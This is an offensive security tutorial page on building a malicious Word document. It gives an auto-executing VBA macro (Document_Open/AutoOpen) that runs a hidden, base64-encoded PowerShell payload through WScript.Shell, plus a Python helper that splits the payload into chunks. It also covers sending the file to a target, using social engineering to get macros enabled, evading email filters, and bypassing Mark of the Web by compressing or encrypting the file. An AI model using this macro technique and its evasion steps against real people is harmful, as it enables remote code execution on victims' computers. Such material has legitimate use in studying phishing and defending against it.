---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Evil Microsoft Office Macro

Macros in Microsoft Office are small programs written in VBA (Visual Basic for Applications) that automate repetitive tasks, but they can also be used to run malicious code if enabled in a document.

We can embed a macro into a Word file to launch a reverse shell or execute a specific command when the document is opened and the macro is enabled.

To execute the payload, the macro uses the Windows Script Host Shell object (`WScript.Shell`), which is an ActiveX object that allows system-level command execution. This enables us to run a PowerShell payload.

We use the `Document_Open` and `AutoOpen` event handlers to ensure the macro is triggered automatically when the target opens the file.

***

## Exploitation

{% stepper %}
{% step %}
### Creating the Malicious Document

Start by opening Microsoft Word and creating a new document. Save the file as either `.doc` or `.docm`. Do not use `.docx`, as it does not support embedded macros!

Next, attach a macro by going to the `View` tab and clicking the `Macros` button:

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

Enter a name for your macro, select your document from the `Macros in` drop-down list, and click `Create`:

<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### Writing the Malicious Macro

Now, write the macro that will execute your payload when the document is opened:

```vb
Sub Document_Open()
    EvilMacro ' Name of the macro
End Sub

Sub AutoOpen()
    EvilMacro ' Name of the macro
End Sub

Sub EvilMacro()
    Dim Payload As String

	<payload-variables-here>

    CreateObject("Wscript.Shell").Run Payload
End Sub
```

Replace the placeholder in the macro with your actual payload string. Since VBA string literals are limited to 255 characters, longer payloads must be split and concatenated.

A simple Python script can be used to break the payload into chunks and generate the required VBA code for concatenation:

```python
p = "powershell.exe -nop -w hidden -e <base64-command>"
m = 255
for i in range(0, len(p), m):
    print('Payload = Payload + "' + p[i:i+m] + '"')
```

{% hint style="warning" %}
Character Set Warning

PowerShell uses UTF-16LE as the default charset for base64 encoding. Using a different charset will break the payload.
{% endhint %}
{% endstep %}

{% step %}
### Delivery the Payload

Once the macro is complete, save the document and send it to the target. When the document is opened, the macro runs automatically, leading to Remote Code Execution.

{% hint style="danger" %}
Beware that the user must enable macros for the attack to work. By default, Office disables macros, so the success of this step may depend on user interaction or effective social engineering.
{% endhint %}
{% endstep %}
{% endstepper %}

***

## Roadblock

Malicious macro attacks are widely known, so email providers and spam filters often block Microsoft Office attachments by default. To bypass this and improve the chances of the target opening the file, we can deliver the document via an alternative method, such as a download link or USB Dropping.

Office documents downloaded from the internet or received via certain channels are tagged with [Mark of the Web (MOTW)](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked), which causes them to open in _Protected View_. This security feature disables editing and blocks macros or embedded objects, creating a barrier to executing the payload, even if the user opens the file. This can be bypassed by compressing or encrypting the file.

Despite these defenses, Office macros continue to be one of the most widely used client-side attack vectors.
